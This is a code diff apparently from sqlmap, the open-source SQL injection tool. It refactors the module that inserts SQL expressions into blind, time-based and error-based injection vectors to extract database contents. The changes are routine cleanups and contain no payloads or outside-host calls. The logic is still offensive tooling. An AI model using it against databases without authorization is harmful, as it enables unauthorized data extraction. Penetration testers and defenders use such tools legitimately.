@@ -2,7 +2,7 @@
 
 """
 Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
-See the file 'doc/COPYING' for copying permission
+See the file 'LICENSE' for copying permission
 """
 
 import re
@@ -42,6 +42,8 @@ from lib.core.exception import SqlmapConnectionException
 from lib.core.exception import SqlmapDataException
 from lib.core.exception import SqlmapNotVulnerableException
 from lib.core.exception import SqlmapUserQuitException
+from lib.core.settings import GET_VALUE_UPPERCASE_KEYWORDS
+from lib.core.settings import INFERENCE_MARKER
 from lib.core.settings import MAX_TECHNIQUES_PER_VALUE
 from lib.core.settings import SQL_SCALAR_REGEX
 from lib.core.threads import getCurrentThreadData
@@ -79,9 +81,9 @@ def _goInference(payload, expression, charsetType=None, firstChar=None, lastChar
     timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
 
     if not (timeBasedCompare and kb.dnsTest):
-        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not re.search("(COUNT|LTRIM)\(", expression, re.I) and not (timeBasedCompare and not conf.forceThreads):
+        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not re.search(r"(COUNT|LTRIM)\(", expression, re.I) and not (timeBasedCompare and not conf.forceThreads):
 
-            if field and re.search("\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I):
+            if field and re.search(r"\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I):
                 expression = "SELECT %s FROM (%s)" % (field, expression)
 
                 if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
@@ -156,7 +158,7 @@ def _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, char
 
     _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)
 
-    rdbRegExp = re.search("RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
+    rdbRegExp = re.search(r"RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
     if rdbRegExp and Backend.isDbms(DBMS.FIREBIRD):
         expressionFieldsList = [expressionFields]
 
@@ -208,22 +210,22 @@ def _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, char
                             message += "entries do you want to retrieve?\n"
                             message += "[a] All (default)\n[#] Specific number\n"
                             message += "[q] Quit"
-                            test = readInput(message, default="a")
+                            choice = readInput(message, default='A').upper()
 
-                            if not test or test[0] in ("a", "A"):
+                            if choice == 'A':
                                 stopLimit = count
 
-                            elif test[0] in ("q", "Q"):
+                            elif choice == 'Q':
                                 raise SqlmapUserQuitException
 
-                            elif test.isdigit() and int(test) > 0 and int(test) <= count:
-                                stopLimit = int(test)
+                            elif choice.isdigit() and int(choice) > 0 and int(choice) <= count:
+                                stopLimit = int(choice)
 
                                 infoMsg = "sqlmap is now going to retrieve the "
                                 infoMsg += "first %d query output entries" % stopLimit
                                 logger.info(infoMsg)
 
-                            elif test[0] in ("#", "s", "S"):
+                            elif choice in ('#', 'S'):
                                 message = "how many? "
                                 stopLimit = readInput(message, default="10")
 
@@ -303,7 +305,7 @@ def _goBooleanProxy(expression):
             return output
 
     vector = kb.injection.data[kb.technique].vector
-    vector = vector.replace("[INFERENCE]", expression)
+    vector = vector.replace(INFERENCE_MARKER, expression)
     query = agent.prefixQuery(vector)
     query = agent.suffixQuery(query)
     payload = agent.payload(newValue=query)
@@ -345,6 +347,9 @@ def getValue(expression, blind=True, union=True, error=True, time=True, fromUser
     kb.safeCharEncode = safeCharEncode
     kb.resumeValues = resumeValue
 
+    for keyword in GET_VALUE_UPPERCASE_KEYWORDS:
+        expression = re.sub(r"(?i)(\A|\(|\)|\s)%s(\Z|\(|\)|\s)" % keyword, r"\g<1>%s\g<2>" % keyword, expression)
+
     if suppressOutput is not None:
         pushValue(getCurrentThreadData().disableStdOut)
         getCurrentThreadData().disableStdOut = suppressOutput
@@ -356,7 +361,7 @@ def getValue(expression, blind=True, union=True, error=True, time=True, fromUser
         if expected == EXPECTED.BOOL:
             forgeCaseExpression = booleanExpression = expression
 
-            if expression.upper().startswith("SELECT "):
+            if expression.startswith("SELECT "):
                 booleanExpression = "(%s)=%s" % (booleanExpression, "'1'" if "'1'" in booleanExpression else "1")
             else:
                 forgeCaseExpression = agent.forgeCaseStatement(expression)
@@ -414,7 +419,7 @@ def getValue(expression, blind=True, union=True, error=True, time=True, fromUser
                     found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE
 
                 if found and conf.dnsDomain:
-                    _ = "".join(filter(None, (key if isTechniqueAvailable(value) else None for key, value in {"E": PAYLOAD.TECHNIQUE.ERROR, "Q": PAYLOAD.TECHNIQUE.QUERY, "U": PAYLOAD.TECHNIQUE.UNION}.items())))
+                    _ = "".join(filter(None, (key if isTechniqueAvailable(value) else None for key, value in {'E': PAYLOAD.TECHNIQUE.ERROR, 'Q': PAYLOAD.TECHNIQUE.QUERY, 'U': PAYLOAD.TECHNIQUE.UNION}.items())))
                     warnMsg = "option '--dns-domain' will be ignored "
                     warnMsg += "as faster techniques are usable "
                     warnMsg += "(%s) " % _
